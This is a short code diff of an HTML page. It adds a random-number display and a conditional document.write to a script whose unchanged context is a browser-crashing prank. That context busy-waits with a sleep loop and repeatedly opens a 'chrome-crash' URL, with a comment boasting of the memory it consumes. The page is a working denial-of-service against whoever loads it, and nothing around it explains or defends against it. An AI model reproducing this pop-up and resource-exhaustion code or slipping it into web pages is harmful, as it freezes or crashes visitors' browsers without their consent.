@@ -44,6 +44,9 @@
         } while (currentDate - date < milliseconds);
      }
       
+     let x = Math.floor((Math.random() * 100) + 1);
+     document.getElementById("demo").innerHTML = x;
+      
      while(1) {
           // Set's A Horrible Statistical Amount Of MEMERY Usage.
           window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
@@ -56,7 +59,9 @@
           sleep(4000)
           window.open("https://chrome-crash-invoke.github.io/chrome-crash/");
           break;
-      } 
+      }   if (x === 34) {
+          document.write("hello");
+      }
     </script>
   </body>
 </html>
